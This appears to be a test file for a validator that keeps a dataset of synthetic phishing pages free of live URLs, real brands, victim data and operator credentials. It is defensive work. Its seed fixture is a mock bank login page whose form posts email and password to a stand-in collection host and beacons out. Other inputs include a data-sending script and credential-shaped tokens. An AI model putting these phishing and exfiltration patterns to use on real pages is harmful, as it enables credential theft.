import { describe, expect, it } from "vitest";
import { checkFixture, type Fixture } from "../src/index";

const clean = (overrides: Partial<Fixture> = {}): Fixture => ({
  id: "seed-credential-harvest",
  url: "https://secure-login.northwind-bank.example/verify",
  html: `<html><head><title>Northwind Bank - Verify</title></head><body>
    <img src="https://cdn.northwind-bank.example/logo.png" alt="Northwind Bank">
    <form action="https://collect.northwind-verify.invalid/submit" method="post">
      <input type="email" name="email" placeholder="you@example.com">
      <input type="password" name="password">
    </form>
    <script>fetch("https://beacon.northwind-verify.invalid/hit")</script>
  </body></html>`,
  truth: "phishing",
  labelledBy: "maintainer",
  category: "credential_harvest",
  campaign: "northwind-verify",
  provenance: null,
  ...overrides,
});

const kinds = (fixture: Fixture) => checkFixture(fixture).map((violation) => violation.kind);

describe("checkFixture", () => {
  it("passes a synthetic page that stays inside reserved names and has a confirmed label", () => {
    expect(checkFixture(clean())).toEqual([]);
  });

  describe("no live URLs", () => {
    it.each([
      ["a page URL on a real domain", { url: "https://login.realbank.com/verify" }],
      ["an IP address", { url: "http://203.0.113.9/login" }],
      ["an asset on a real domain", { html: '<img src="https://cdn.realbank.com/logo.png">' }],
      ["a protocol-relative script", { html: '<script src="//tracker.realbank.net/t.js"></script>' }],
      ["a link inside inline script", { html: '<script>location.href = "https://next-step.realbank.co/"</script>' }],
    ])("flags %s", (_what, overrides) => {
      expect(kinds(clean(overrides))).toContain("live_url");
    });

    it.each([
      "https://example.com/",
      "https://login.example.net/",
      "https://portal.example.org/",
      "https://bank.test/",
      "https://anything.example/",
      "https://collect.nowhere.invalid/",
    ])("accepts the reserved name in %s", (url) => {
      expect(kinds(clean({ url }))).not.toContain("live_url");
    });
  });

  describe("no working form or script targets", () => {
    it("flags a form that posts to a name that resolves, even a reserved one", () => {
      const html = '<form action="https://collect.example.com/submit" method="post"></form>';
      expect(kinds(clean({ html }))).toContain("working_target");
    });

    it("flags a script that sends data to a name that resolves", () => {
      const html = '<script>navigator.sendBeacon("https://api.example.net/c", data)</script>';
      expect(kinds(clean({ html }))).toContain("working_target");
    });

    it("accepts a relative form action, which goes nowhere outside the snapshot", () => {
      const html = '<form action="/verify/step-2" method="post"></form>';
      expect(kinds(clean({ html }))).not.toContain("working_target");
    });
  });

  describe("no real brands", () => {
    it.each(["PayPal", "microsoft", "Office 365", "HMRC", "Coinbase", "DocuSign"])("flags %s", (brand) => {
      expect(kinds(clean({ html: `<h1>Sign in to your ${brand} account</h1>` }))).toContain("real_brand");
    });

    it("flags a real brand in the URL too", () => {
      expect(kinds(clean({ url: "https://paypal-verify.example/login" }))).toContain("real_brand");
    });
  });

  describe("nothing resembling victim data", () => {
    it("flags an email address outside reserved names", () => {
      expect(kinds(clean({ url: "https://bank.test/verify#jane.doe@gmail.com" }))).toContain("victim_data");
    });

    it("accepts an email address on a reserved name", () => {
      expect(kinds(clean({ html: "<p>Contact support@northwind-bank.example</p>" }))).not.toContain("victim_data");
    });

    it.each(["4111 1111 1111 1111", "5500-0000-0000-0004", "340000000000009"])(
      "flags a number that passes the card checksum: %s",
      (number) => {
        expect(kinds(clean({ html: `<input value="${number}">` }))).toContain("victim_data");
      },
    );

    it("accepts a long number that fails the card checksum", () => {
      expect(kinds(clean({ html: "<p>Reference 4111111111111112</p>" }))).not.toContain("victim_data");
    });
  });

  describe("no operator credentials", () => {
    // Documentation examples, assembled at runtime so that secret scanners reading this
    // public repository never see a whole credential-shaped string in the source.
    it.each([
      ["a Telegram bot token", ["123456789", "AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsawz"].join(":")],
      ["an AWS access key", ["AKIA", "IOSFODNN7EXAMPLE"].join("")],
      ["a Discord webhook path", ["/api", "webhooks", "123456789012345678", "abcDEF_ghi-JKL"].join("/")],
    ])("flags %s", (_what, secret) => {
      expect(kinds(clean({ html: `<script>const k = "${secret}"</script>` }))).toContain("credential");
    });
  });

  describe("every label is set by a person", () => {
    it.each([null, ""])("flags a label nobody has confirmed (%j)", (labelledBy) => {
      expect(kinds(clean({ labelledBy }))).toContain("unconfirmed_label");
    });
  });

  it("reports where each problem is, so it can be fixed", () => {
    const violations = checkFixture(clean({ url: "https://login.realbank.com/verify" }));
    expect(violations).toContainEqual({
      kind: "live_url",
      fixture: "seed-credential-harvest",
      detail: expect.stringContaining("login.realbank.com"),
    });
  });
});
